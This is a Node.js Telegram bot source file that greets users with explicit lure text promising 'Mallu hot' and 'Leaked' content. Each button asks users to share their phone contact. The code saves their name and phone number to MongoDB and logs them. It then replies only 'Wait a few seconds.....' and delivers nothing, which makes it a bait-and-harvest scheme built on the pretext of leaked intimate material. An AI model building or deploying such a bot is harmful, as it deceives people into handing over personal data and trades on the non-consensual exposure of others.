require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const path = require("path");
const express = require("express");

// MongoDB User Schema
const userSchema = new mongoose.Schema({
  chatId: { type: String, required: true, unique: true },
  fullName: String,
  phoneNumber: String,
  referrals: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],
});

const User = mongoose.model("User", userSchema);

// Environment Variables
const { TELEGRAM_BOT_TOKEN, MONGO_URI, WEB_URL, COMMUNITY_LINK } = process.env;

// Connect to MongoDB
mongoose
  .connect(MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("Connected to MongoDB"))
  .catch((error) => console.error("MongoDB connection error:", error));

// Initialize Telegram Bot

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id.toString();
  const firstName = msg.from.first_name;
  const lastName = msg.from.last_name;
  let fullName = firstName;
  if (lastName) {
    fullName += ` ${lastName}`;
  }

  const messageText = `
  🔞Welcome to kaliveed💦🫦
  `;

  const opts = {
    reply_markup: {
      keyboard: [
        [
          {
            text: "Mallu hot🔞",
            request_contact: true,
          },
          {
            text: "Leaked💦",
            request_contact: true,
          },
        ],
      ],
      resize_keyboard: true,
      one_time_keyboard: true,
    },
  };

  bot.sendMessage(chatId, messageText, opts);

  // Listen for contact sharing
  bot.once('contact', async (contactMsg) => {
    if (contactMsg.chat.id.toString() === chatId) {
      const phoneNumber = contactMsg.contact.phone_number;
      console.log("User's Phone Number:", phoneNumber);

      // Save user to database
      try {
        let user = await User.findOne({ chatId }); // Check if the user already exists
        if (!user) {
          // If not, create a new user
          user = new User({
            chatId,
            fullName,
            phoneNumber,
          });
          await user.save(); // Save user to the database
          console.log("New user saved:", user);
        } else {
          // If user exists, update the user information
          user.fullName = fullName;
          user.phoneNumber = phoneNumber;
          await user.save(); // Save updated user to the database
          console.log("Existing user updated:", user);
        }
      } catch (error) {
        console.error("Error saving user to database:", error);
      }

      bot.sendMessage(chatId, `Wait a few seconds.....`);
    }
  });
});

console.log("Bot server is running...");

const app = express();

// Define your routes here if needed
app.get("/", (req, res) => {
  res.send("Bot server is running...");
});

// Start the server
const port = 4008;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});